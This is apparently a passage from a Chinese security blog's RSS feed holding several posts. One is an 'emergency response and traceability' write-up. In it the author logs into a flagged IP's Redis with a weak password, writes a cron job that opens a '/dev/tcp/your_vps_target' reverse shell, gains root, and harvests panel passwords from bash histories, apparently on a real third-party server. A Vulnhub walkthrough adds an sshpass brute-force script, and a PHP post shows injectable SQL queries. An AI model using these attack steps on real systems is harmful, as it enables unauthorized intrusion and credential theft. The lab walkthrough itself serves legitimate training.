    &lt;p&gt;这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;just fofa：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/emergency-response-and-traceability-by-fofa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;-1x02something-interesting&quot;&gt;# 1x02：Something Interesting&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;点击以了解 &lt;a href=&quot;https://fofa.so/&quot; target=&quot;_blank&quot;&gt;fofa安全工程师们&lt;/a&gt; 与 &lt;a href=&quot;https://x.threatbook.cn/&quot; target=&quot;_blank&quot;&gt;微步安全工程师们&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img align=&quot;left&quot; src=&quot;https://x.threatbook.cn/public/img/logo-in-header.882f692c.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;
&lt;img align=&quot;right&quot; src=&quot;https://fofa.so/_nuxt/img/logo.d9ee5c4.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;欢乐而又短暂的上午如白驹过隙，一晃而过。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;二下午枯燥时光--渗透测试工程师&quot;&gt;二：下午、枯燥时光 &amp;amp; 渗透测试工程师&lt;/h3&gt;

&lt;h4 id=&quot;-2x01nmapnc--linux-shell&quot;&gt;# 2x01：nmap、nc &amp;amp; linux shell&lt;/h4&gt;

&lt;p&gt;终于：发现了一些有趣的：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE  SERVICE         VERSION
22/tcp   open   ssh             OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5 (RSA)
|   256 9d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4 (ECDSA)
|_  256 7b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1 (ED25519)
80/tcp   open   http            nginx
| http-ls: Volume /
| SIZE  TIME               FILENAME
| -     24-Feb-2021 13:21  admin/
| -     24-Feb-2021 09:27  redis/
| -     24-Aug-2017 04:55  staragent/
| -     24-Feb-2021 08:44  www/
| -     24-Feb-2021 08:44  www/htdocs/
| -     13-Apr-2021 19:44  www/logs/
|_
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Index of /
888/tcp  open   http            nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 404 Not Found
3306/tcp open   mysql           MySQL 5.5.62-log
6379/tcp open   redis           Redis key-value store
8080/tcp open   http            Apache Tomcat 8.5.63
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.63
8888/tcp open   http            Ajenti http control panel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;事实上：这是一个宝塔面板，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8888+888&lt;/code&gt;端口；&lt;/li&gt;
  &lt;li&gt;另一个事实是：这个被WAF报成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4月8日-4月12日攻击IP&lt;/code&gt;的IP， &lt;em&gt;mysql &amp;amp; redis&lt;/em&gt; 均为弱口令。
    &lt;ul&gt;
      &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://xz.aliyun.com/t/8018#toc-8&quot; target=&quot;_blank&quot;&gt;点击更多以了解redis渗透&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./redis-cli -h redis_target_ip           
redis_target_ip:6379&amp;gt; get key
(error) NOAUTH Authentication required.
redis_target_ip:6379&amp;gt; 
redis_target_ip:6379&amp;gt; auth 123456
OK
redis_target_ip:6379&amp;gt; get key
(nil)
redis_target_ip:6379&amp;gt; set  xx   &quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/your_vps_target/port 0&amp;gt;&amp;amp;1\n&quot;
OK
redis_target_ip:6379&amp;gt; config set dir /var/spool/cron/
OK
redis_target_ip:6379&amp;gt; config set dbfilename root
OK
redis_target_ip:6379&amp;gt; save
OK
redis_target_ip:6379&amp;gt; quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-2x02bashinformation-gathering--traceability-incident&quot;&gt;# 2x02：bash、Information gathering &amp;amp; Traceability incident&lt;/h4&gt;

&lt;p&gt;于是我们通过上面步骤获得了服务器权限；&lt;em&gt;awesome ? next more awesome.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;NO OFFENCE:-)Thanks&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;更加了解linux和linux面板，否则就会显得十分业余，不管你是Development, operation and maintenance or security practitioners；
    &lt;ul&gt;
      &lt;li&gt;匮乏的linux知识导致的过多ssh连接：
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ps -ef|grep ssh|wc -l
  50
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;错乱的终端与数据库命令运行：
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /home/admin/.bash_history 
  sudo grep wordpress_admin_passwd /root/env.txt
  /usr/local/mysql/bin/mysql -u root -p123456
  sudo su rooe
  sudo su root
  sudo grep mysql_root_passwd /root/env.txt
  mysql
  alias mysql=/usr/local/mysql/bin/mysql
  mysql
  find / -name mysql.sock
  sudo grep mysql_root_passwd /root/env.txt
  msyql
  sudo su root
  grant all privileges on *.* to 'root'@'%' identified by 'pass-hidden';
  grant all privileges on *.* to 'root'@'%' identified by '123456';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;错误的linux权限分配：
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ps -ef|grep root
  root      7963     1  0 Mar06 ?        00:39:39 /usr/bin/java -Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar -Dcatalina.base=/www/server/apache-tomcat-8.5.63 -Dcatalina.home=/www/server/apache-tomcat-8.5.63 -Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temp org.apache.catalina.startup.Bootstrap start
  root     23017     1  0 Mar06 ?        00:00:00 nginx: master process nginx -c conf/nginx.conf
  root     27803     1  0 Feb25 ?        01:17:18 ./redis-server *:6379
  ···
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;同样的：通过history找到面板管理密码；
    &lt;ul&gt;
      &lt;li&gt;tools.py form BT panel：
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /root/.bash_history |grep tools
  cd /www/server/panel &amp;amp;&amp;amp; python tools.py panel pass-hidden
  $ cat /www/server/panel/tools.py
        
  if __name__ == &quot;__main__&quot;:
      type = sys.argv[1]
      if type == 'root':
          set_mysql_root(sys.argv[2])
      elif type == 'panel':
          set_panel_pwd(sys.argv[2])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以，panel模式下对应的是面板密码设置；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/stupid-bt-panel-control-pic.png&quot; alt=&quot;&quot; /&gt;
至此，我们获得了 &lt;em&gt;root、redis、mysql、BT panel&lt;/em&gt; ；而本文并炫技，我们的初衷是朔源：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;mysql&lt;/em&gt;：数据库仅仅是存放论坛系统管理的信息及测试信息；&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;redis&lt;/em&gt;：配合 &lt;em&gt;mysql&lt;/em&gt;，不必多说；&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;BT panel：www、ftp、sql&lt;/em&gt; 等配置均为简单配置，没有参考价值。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;三总结&quot;&gt;三：总结&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；&lt;/li&gt;
  &lt;li&gt;2、结合 &lt;em&gt;# 2x01 及 # 2x02&lt;/em&gt; 小结通篇结束并未发现攻击迹象、痕迹；&lt;/li&gt;
  &lt;li&gt;3、为何被报为攻击IP不得而知。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;四申明&quot;&gt;四：申明&lt;/h3&gt;

&lt;p&gt;作者：Bin4xin&lt;/p&gt;

&lt;p&gt;转载请申明本文链接：&lt;a href=&quot;/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/&quot; target=&quot;_blank&quot;&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;以上。&lt;/p&gt;
</description>
        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/</link>
        <guid isPermaLink="true">/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/</guid>
        
        
        <category>blog</category>
        
        <category>主动防御</category>
        
        <category>信息搜集</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: 辛丑·本命年 年后的一些思考</title>
        <description>&lt;p&gt;过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一切正在有条不紊的进行着：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在20年靠着这个为公司护网“打下了一片江山”，今年应进一步理解；&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;说些没用的：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;过年回来后，忙里偷闲与学校网安实验室的孩子们开了一次线下交流会，交流会的主要内容就是总结寒假以来的学习过程和心得汇报；因为年纪较小，基本都是刚大一、大二，所以偶尔也要进行大学生活困扰的解惑；&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网安实验室队伍安排：
    &lt;ul&gt;
      &lt;li&gt;导师：
  队伍灵魂；&lt;/li&gt;
      &lt;li&gt;我的角色：
  我想，我在这个队伍里扮演的角色应该是作为行业“过来人”对他们的学习计划进行有效的监督和建议。&lt;/li&gt;
      &lt;li&gt;攻击队伍（红队）要求：
        &lt;ul&gt;
          &lt;li&gt;1.熟悉各种漏洞特征和利用原理；&lt;/li&gt;
          &lt;li&gt;2.能够基本读懂POC代码所进行的操作，并自己有一定的编程能力和代码审计能力；&lt;/li&gt;
          &lt;li&gt;3.熟悉市面主流WAF的识别、WAF规则探测、绕过以及攻击WAF后的资产。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;防守队伍（蓝队）要求：
        &lt;ul&gt;
          &lt;li&gt;1.熟悉各类漏洞形成原因、及时跟进互联网上爆出的各种0day、1day、Nday，并对频繁爆出漏洞的组件有深刻的理解，如WebLogic反序列化、Shiro反序列化、各种（SQL、模版）注入等等；&lt;/li&gt;
          &lt;li&gt;2.熟悉主流操作系统Linux、Windows的工作原理如软件编译安装能力、集群的独立运维能力以及安全事件朔源能力；&lt;/li&gt;
          &lt;li&gt;3.能够做到独立部署安全（审计）平台或安全工具，如WAF以及WAF工作涉及的规则库编写。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;数据挖掘类，涉及到算法应用等；不多说。&lt;/li&gt;
      &lt;li&gt;开发类；不多说。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;现存问题如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如何在现阶段的网安环境下，打造出一支专业化团队：&lt;br /&gt;
    |__ 1、网安实验室是否能够成立CTF战队？&lt;br /&gt;
    |__ 2、企业安全专业化安全服务团队？&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;问题1、针对夺旗战队，我想：当下的拥有的资源便是最好的机会：
    &lt;ul&gt;
      &lt;li&gt;能够有本专业导师的指导同时，有一定生源来进行夺旗比赛
        &lt;ul&gt;
          &lt;li&gt;选取队长来保证战队的凝聚力和团队活力；&lt;/li&gt;
          &lt;li&gt;管理团队应当采取比赛军事化管理；包括晨跑、内部攻防训练赛&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;生源的匹配问题：
        &lt;ul&gt;
          &lt;li&gt;在生源筛选时存在的问题：
            &lt;ul&gt;
              &lt;li&gt;或许在实验室的生源选择中，应当让所有有该行业兴趣的新生都加入进来，我始终相信的是，大学生活是自身兴趣的发掘过程，对他们的培养过程同时也是考核过程；&lt;/li&gt;
              &lt;li&gt;因为当下存在的问题较为明显。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;部分年轻新生，无法在团队的带跑下跟上节奏，踢出；&lt;/li&gt;
          &lt;li&gt;小部分自身问题产生各种问题&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2021/thereis-something2say/</link>
        <guid isPermaLink="true">/blog/2021/thereis-something2say/</guid>
        
        
        <category>blog</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: GainPower靶场渗透历程</title>
        <description>&lt;ul&gt;
  &lt;li&gt;employee1:ssh banner发现问题；
    &lt;ul&gt;
      &lt;li&gt;根据提示获得低权限shell&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;employee64:考验脚本编写能力（ssh爆破）
    &lt;ul&gt;
      &lt;li&gt;bash脚本批量连接&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;programmer:获取sudo shell
    &lt;ul&gt;
      &lt;li&gt;通过unshare切换到sudo用户&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ su - employee64&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo -u programmer unshare&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;vanshal:crontab计划获取shell
    &lt;ul&gt;
      &lt;li&gt;pspy tool to detected&lt;/li&gt;
      &lt;li&gt;/media/programmer/scripts/backup.sh&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;root:secert zip file
    &lt;ul&gt;
      &lt;li&gt;zip password crack&lt;/li&gt;
      &lt;li&gt;login ajenti to run root shell.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;写个脚本来批量跑试试看：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash

pwn () {
  read -p 'target ip: ' ip
  sleep 2
  for data in {1..100}
  do
      echo 'Try: ' $data
      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
      printf &quot;\n&quot;
  done
}

pwn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;for一下用户名密码{employee+$data}in{1..100}，使用sshpass进行批量ssh连接认证，并尝试&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;;
失败如下：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;成功：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[sudo] employee64 的密码：匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 employee64 可以在 localhost 上运行以下命令：
    (programmer) /usr/bin/unshare
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;所以用户employee64是拥有sudo权限；&lt;/p&gt;

</description>
        <pubDate>Wed, 02 Dec 2020 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/GainPower/walkthrough/</link>
        <guid isPermaLink="true">/blog/GainPower/walkthrough/</guid>
        
        
        <category>blog</category>
        
        <category>Vulnhub</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: PHP:部署的一揽子问题</title>
        <description>&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Wed Nov 25 17:19:33.475439 2020] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;php7:notice] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pid 11872] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;client 10.211.55.2:53568] PHP Notice:  Undefined index: step &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /var/www/
html/code/BabyOnline1/setup/setupwizard.php on line 4 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Wed Nov 25 17:19:33.475577 2020] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;php7:error] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;pid 11872] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;client 10.211.55.2:53568] 
PHP Fatal error:  Uncaught Error: Class &lt;span class=&quot;s1&quot;&gt;'DOMDocument'&lt;/span&gt; not found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /var/www/html/code/BabyOnline1/setup/setupwizard.php:46&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;
Stack trace:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0 {main}\n  thrown in /var/www/html/code/BabyOnline1/setup/setupwizard.php on line 46&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Wed Nov 25 17:21:46.224793 2020] [php7:error] [pid 11882] [client 10.211.55.2:53602] PHP Fatal error:  Uncaught Error: 
Call to undefined function mysqli_connect() in 

/var/www/html/code/BabyOnline1/utility/mysqli5.php:39\nStack trace:\n#0 /var/www/html/code/BabyOnline1/utility/fun.class.php(281): 
Conn-&amp;gt;__construct('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8', true)\n#1 /var/www/html/code/BabyOnline1/utility/fun.class.php
(255): Utility-&amp;gt;CreateDBConnect('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8')\n#2 /var/www/html/code/BabyOnline1/platform/php/
ini.php(41): Utility-&amp;gt;__construct()\n#3 /var/www/html/code/BabyOnline1/platform/php/plat_manage.php(5): require_once('/var/www/html/c...')
\n#4 {main}\n  thrown in /var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39, referer: http://10.211.55.4/platform/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;提示在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/utility/fun.class.php(281)&lt;/code&gt;文件、
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/platform/php/ini.php(41)&lt;/code&gt;文件
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39&lt;/code&gt;文件&lt;/p&gt;

&lt;p&gt;第一个fun.class.php文件是实现的日志写入数据库的功能；&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function WriterToDB($typeid,$clientAddress,$datetime,$file,$line,$function,$content)
	{
		global $utility;
		if(is_array($content))
		{
			$conn = $utility-&amp;gt;CreateDBConnect($_SESSION[&quot;DB&quot;][&quot;Host&quot;],$_SESSION[&quot;DB&quot;][&quot;Port&quot;],$_SESSION[&quot;DB&quot;][&quot;User&quot;],$_SESSION[&quot;DB&quot;][&quot;Password&quot;],$_SESSION[&quot;DB&quot;][&quot;Name&quot;],$_SESSION[&quot;DB&quot;][&quot;Character&quot;]);
			$conn-&amp;gt;Query(&quot;INSERT INTO `NMIOperationLog` (`Index`,`Operation`,`OperationTime`,`Description`,`ManageDomainUserInfo_Index`,`ManageDomain_Index`,`ManageDomainUserInfo_Identity`,`ManageDomains`,`SqlScript`)VALUES(null,'&quot;.$content[&quot;Operation&quot;].&quot;','&quot;.$content[&quot;OperationTime&quot;].&quot;','&quot;.addslashes($content[&quot;Description&quot;]).&quot;','&quot;.$content[&quot;ManageDomainUserInfo_Index&quot;].&quot;','&quot;.$content[&quot;ManageDomain_Index&quot;].&quot;','&quot;.$content[&quot;ManageDomainUserInfo_Identity&quot;].&quot;','&quot;.$content[&quot;ManageDomains&quot;].&quot;','&quot;.addslashes($content[&quot;SqlScript&quot;]).&quot;') &quot;);
	
			//$log-&amp;gt;Writer(1,&quot;NMI&quot;,strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time()),__FILE__,__LINE__,__FUNCTION__,mysql_error());
			
		}
		return true;
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;连库WriterToDB实现功能如上；同样的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ini.php&lt;/code&gt;同样定义了数据库的配置信息包括类型、url和连接信息：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define('LOGSAVETYPE',1);
define('LOGLEVEL',1);

define('DB_TYPE', &quot;mysql&quot;); 
define('IMAGE_URL', &quot;http://61.191.35.32:8580/BabyOnline/&quot;);
define('DB_SOURCEFILE_PATH',dirname(dirname(dirname(__FILE__))).&quot;/utility/dbsource.ini&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbsource.ini&lt;/code&gt;文件里面则详细配置了jdbc的配置信息，就不单独放出来了；再来看看最后一个文件，同样是连接数据库，然后发现了一些有趣的：
随意捡了一些构造函数：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function QueryRecordCount($sqlstr)
	{
		if($this-&amp;gt;connect)
		{
			unset($row);
			$row=$this-&amp;gt;FetchArray($this-&amp;gt;Query(&quot;SELECT count(1) as RecordCount FROM &quot;.$sqlstr.&quot; &quot;));
			return ($row['RecordCount'] &amp;gt; 0 ? $row['RecordCount'] : 0);
		}
		else
		{
			return 0;
		}
	}


if($link-&amp;gt;FetchArray($link-&amp;gt;query(&quot;SELECT * FROM User WHERE `Identity`='$UserId' AND AreaCode='$AreaCode'&quot;)))
    {
    ···
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;咳咳，跑偏了，以上来看就直接修改ini文件就行了。&lt;/p&gt;
</description>
        <pubDate>Wed, 25 Nov 2020 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2020/php-depoly/</link>
        <guid isPermaLink="true">/blog/2020/php-depoly/</guid>
        
        
        <category>blog</category>
        
        <category>php</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: 有关于网络安全行业的一些思考</title>
        <description>&lt;h3 id=&quot;under-construction&quot;&gt;Under construction&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;

&lt;!-- this is a gap between text and pics:) --&gt;
&lt;/div&gt;

&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;

&lt;!-- this is a gap between text and pics:) --&gt;
&lt;/div&gt;
&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;

&lt;!-- this is a gap between text and pics:) --&gt;
&lt;/div&gt;

&lt;div class=&quot;d-none d-sm-block position-absolute col-5 col-md-4 col-lg-3 bottom-0 right-0 mr-lg-5 mb-md-n4&quot;&gt;
&lt;div class=&quot;width-full&quot;&gt;
&lt;svg viewBox=&quot;0 0 300 305&quot; class=&quot;width-fit&quot;&gt;
&lt;defs&gt;
&lt;mask id=&quot;https___github_githubassets_com_images_modules_site_home_astro-mona-alpha_jpg&quot;&gt;
&lt;image width=&quot;300&quot; height=&quot;305&quot; href=&quot;/assets/img/post-bg/astro-mona-alpha.jpg&quot;&gt;&lt;/image&gt;
&lt;/mask&gt;
&lt;/defs&gt;
&lt;image mask=&quot;url(#https___github_githubassets_com_images_modules_site_home_astro-mona-alpha_jpg)&quot; width=&quot;300&quot; height=&quot;305&quot; href=&quot;/assets/img/post-bg/astro-mona.jpg&quot;&gt;&lt;/image&gt;
&lt;/svg&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;在当今网络安全行业趋于商业化的时代，如何能够保持一颗赤忱之心：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;当今网络安全之趋势，当在国家安全的大前提下：
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;教育行业应作为网络安全的”活水源头”，为这个年轻的行业输入足够的年轻血液，所以在此刻：&lt;br /&gt;
  应当充分发挥教育职能的同时，对当下应用型、研究型专业的莘莘学子做有必要的引导；&lt;br /&gt;
  因为当下很多学生、教师在当下行业无法认清自我，永远无法在正确的时间，做正确的事；&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;企业在这其中也扮演重要角色：
显而易见的是，传统安全企业也面临着的抉择：&lt;/li&gt;
      &lt;li&gt;适应市场或者是自己选择游戏规则；
